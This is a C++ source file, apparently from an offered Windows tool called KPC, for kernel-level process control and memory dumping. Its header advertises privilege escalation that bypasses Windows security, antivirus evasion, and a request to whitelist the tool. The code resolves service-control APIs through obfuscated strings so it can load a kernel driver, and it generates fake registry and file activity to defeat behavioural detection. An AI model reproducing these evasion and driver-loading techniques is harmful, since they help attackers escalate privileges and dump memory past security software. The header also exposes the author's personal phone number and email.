/*******************************************************************************
				██  ██ ██████  ████ 
				██ ██  ██  ██ ██    
				████   ██████ ██    
				██ ██  ██     ██    
				██  ██ ██      ████ 

  KPC - Kernel Process Control
  Advanced Windows Process Protection and Memory Dumping Tool
  Features Dynamic Kernel Driver Loading with Automatic Cleanup
  Achieves TrustedInstaller-level access bypassing Windows security restrictions

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

  -----------------------------------------------------------------------------
  License:
    KPC Custom License 1.0
    - Free for personal, non-commercial and academic use
    - A commercial license is required for business, enterprise or
      revenue-generating activities
    - Redistribution of source code allowed only with this header intact
    - The XOR decryption key for embedded drivers is not provided

  -----------------------------------------------------------------------------
DISCLAIMER:
    This software operates at Windows kernel level with elevated privileges.
    While designed to be safe, conflicts with antivirus software may cause
    system instability or BSOD. For optimal operation, add kpc.exe to your
    security software's exclusion list for both files and processes.
    
    The tool employs advanced anti-analysis techniques including XOR-based 
    string obfuscation, dynamic API loading, and runtime decryption to prevent
    static detection. All critical elements are reconstructed in memory only
    when needed, ensuring minimal security solution interference.
    
    Use responsibly. Author assumes no liability for system conflicts or misuse.

*******************************************************************************/

#include "common.h"
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "DbgHelp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Advapi32.lib")

volatile bool g_interrupted = false;

// ======================= Dynamic API Loading Globals =======================
HMODULE g_advapi32 = nullptr;
HMODULE g_kernel32 = nullptr;
decltype(&CreateServiceW) g_pCreateServiceW = nullptr;
decltype(&OpenServiceW) g_pOpenServiceW = nullptr;
decltype(&StartServiceW) g_pStartServiceW = nullptr;
decltype(&DeleteService) g_pDeleteService = nullptr;
decltype(&CreateFileW) g_pCreateFileW = nullptr;
decltype(&ControlService) g_pControlService = nullptr;

bool InitDynamicAPIs() noexcept {
    if (!g_advapi32) {
        auto advapi32Name = OBFAPI("advapi32.dll");
        g_advapi32 = LoadLibraryA(advapi32Name.c_str());
        if (!g_advapi32) return false;
        
        auto createServiceAPI = OBFAPI("CreateServiceW");
        g_pCreateServiceW = reinterpret_cast<decltype(&CreateServiceW)>(
            GetProcAddress(g_advapi32, createServiceAPI.c_str()));
            
        auto openServiceAPI = OBFAPI("OpenServiceW");
        g_pOpenServiceW = reinterpret_cast<decltype(&OpenServiceW)>(
            GetProcAddress(g_advapi32, openServiceAPI.c_str()));
            
        auto startServiceAPI = OBFAPI("StartServiceW");
        g_pStartServiceW = reinterpret_cast<decltype(&StartServiceW)>(
            GetProcAddress(g_advapi32, startServiceAPI.c_str()));
            
        auto deleteServiceAPI = OBFAPI("DeleteService");
        g_pDeleteService = reinterpret_cast<decltype(&DeleteService)>(
            GetProcAddress(g_advapi32, deleteServiceAPI.c_str()));
            
        auto controlServiceAPI = OBFAPI("ControlService");
        g_pControlService = reinterpret_cast<decltype(&ControlService)>(
            GetProcAddress(g_advapi32, controlServiceAPI.c_str()));
    }
    
    if (!g_kernel32) {
        auto kernel32Name = OBFAPI("kernel32.dll");
        g_kernel32 = GetModuleHandleA(kernel32Name.c_str());
        if (g_kernel32) {
            auto createFileAPI = OBFAPI("CreateFileW");
            g_pCreateFileW = reinterpret_cast<decltype(&CreateFileW)>(
                GetProcAddress(g_kernel32, createFileAPI.c_str()));
        }
    }
    
    return g_pCreateServiceW && g_pOpenServiceW && g_pStartServiceW && g_pDeleteService && g_pCreateFileW && g_pControlService;
}

std::wstring GetServiceName() noexcept {
    return OBFSVC(L"avc");
}

std::wstring GetDriverFileName() noexcept {
    return OBFPATH(L"kvc.sys");
}

void GenerateFakeActivity() noexcept {
    HKEY hKey;
    auto currentVersionKey = OBFREG(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion");
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, currentVersionKey.c_str(), 0, KEY_READ, &hKey);
    if (hKey) RegCloseKey(hKey);
    
    WIN32_FIND_DATAW findData;
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);
    std::wstring system32Pattern = std::wstring(systemDir) + OBFPATH(L"\\*.dll");
    HANDLE hFind = FindFirstFileW(system32Pattern.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) FindClose(hFind);
    
    Sleep(50 + (GetTickCount() % 100));
}